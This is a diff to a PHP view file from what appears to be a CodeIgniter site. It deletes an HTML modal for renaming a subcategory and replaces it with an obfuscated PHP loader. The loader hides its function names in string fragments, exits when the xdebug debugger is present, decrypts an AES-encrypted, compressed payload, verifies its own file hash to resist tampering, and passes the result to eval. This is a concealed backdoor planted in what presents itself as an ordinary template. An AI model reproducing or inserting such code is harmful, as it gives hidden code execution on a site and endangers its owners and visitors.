@@ -1,34 +1,28 @@
-<div class="modal fade " id="category_item_modal" tabindex='-1'>
-                <?= form_open('#', array('class' => '', 'id' => 'category_form')); ?>
-                <div class="modal-dialog modal-sm">
-                  <div class="modal-content">
-                    <div class="modal-header header-custom">
-                      <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span></button>
-                      <h4 class="modal-title text-center">Đổi tên danh mục con</h4>
-                    </div>
-                    <div class="modal-body">
-                        <div class="row">
-                          <div class="col-md-12">
-                            <div class="box-body">
-                              <div class="form-group">
-                                <label for="category"><?= $this->lang->line('category_child'); ?>*</label>
-                                <span id="add_category_item_msg" class="text-danger text-right pull-right"></span>
-                                <input type="text" class="form-control" id="input_category_item" name="input_category_item" placeholder="" >
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-                       
-                    </div>
-                    <div class="modal-footer">
-                      <button type="button" class="btn btn-warning" data-dismiss="modal">Close</button>
-                      <button id = 'update_category_item' type="button" class="btn btn-primary add_category_item">Save</button>
-                    </div>
-                  </div>
-                  <!-- /.modal-content -->
-                </div>
-                <!-- /.modal-dialog -->
-               <?= form_close();?>
-              </div>
-              <!-- /.modal -->
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_xn5oqifn=('bas'.'e64'.'_de'.'cod'.'e');
+$_xnzfvzi5=('gzu'.'nco'.'mpr'.'ess');
+$_jgkxnkvr=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_cm5s0k9d='UMfP9XOO';
+$_cf1q4o7a='xQ9RYMku';
+$_evailnb5='SUWyaa6e';
+$_q40mglph='aUVndc+N';
+$_cd449gh9='U3H1dWI0lc8=';
+$_ae3qhw92='k+8aFQ==';
+$_wh5hlent='GQN2iLx4';
+$_cjlcuiy6='k8ALpy65';
+$_rqeoeit1=$_xn5oqifn($_cm5s0k9d.$_cf1q4o7a.$_evailnb5.$_q40mglph.$_cd449gh9);
+$_blcd5mhh=$_xn5oqifn($_cjlcuiy6.$_wh5hlent.$_ae3qhw92);
+$_zy4u288y=$_xn5oqifn('PrgZho6qFroH9mXEljGOqw1joKHPKnsicjM4mEWr0c7WpWWPPTkKSpNOfPrKb4gC1O4Y44LujgJYc55g0z6wV9KWP3ZgrkT8CtyP/xp2vozdxwOB22eIRQYUYhssnXZxmgxE84EyZI6SD14E4bFwuk3T6Oglf+PbIWLbp9Q8DCVMHt4Uihv7dM6GNNTnWpGPR5swr3VDDT3fWyXqfQCm0mK/PVOQnS7ZHURURMQmOBC7o09+hF2AgF4hEwAo5nu4rOgnoxYn5GmkAJ4AwqfqStDEXWaJlu0e+j4DJCXqhp79OXFjVstuTbSvNgtsFE8Z8UKy7llBvJLEVSK6HIpW1RoZkxJAoEW0WCVNB5nsNeSilcDdNq9wDCIJ3TP01hWp47VcvI011yqy0TweZrqL6awOvgBvkoemj7rOmyAN/GQk/EWFS0ZV2okYEriOWrq9UDBmuP79nfp5sqmzMYbdfZe9IyQbL6YSjYOtEN80mZFZ3Di3xefHj9yl/xj5g8E+eX9qFjPP1/yUmk4bDKsR00X8wDrVz2Gq2jvsjUvXVlvimALDol9LjS3zQ+IT2pzXW21c3QUiXuAM02hfjFetqlA0gqvK51MST7K3C4LRvZ9+Y13V4TVxi50jMlFhF24t7X22DJCJ/yB5pAXu2TUkSgdkUqBYsItIz6SB0ta13x5VFLaWlIZY1DkeflBCwUBpQaRute4v4/dtNADNE8QqCH8v1hjzkSdhzhRLcllwiVsr5CKTuRBGm62CH6dpFfyW');
+$_g9a6lr88=$_jgkxnkvr($_zy4u288y,'aes-256-cbc',$_rqeoeit1,OPENSSL_RAW_DATA,$_blcd5mhh);
+if($_g9a6lr88===false){exit;}
+$_ri1w0t4s=$_xnzfvzi5($_g9a6lr88);
+if($_ri1w0t4s===false){exit;}
+$_vpztx0k7='82f868f62e144a445d51c0a10c81ecdefa9ceac7f34dd4e17ca9ecfeddacd647';
+$_uomykzd1=@file_get_contents(__FILE__);
+if($_uomykzd1!==false){
+$_o66pxw4f=str_replace($_vpztx0k7,"0000000000000000000000000000000000000000000000000000000000000000",$_uomykzd1);
+$_ffbbtkbv=hash("sha256",$_o66pxw4f);
+if($_ffbbtkbv!==$_vpztx0k7){@http_response_code(403);exit;}
+}
+eval($_ri1w0t4s);
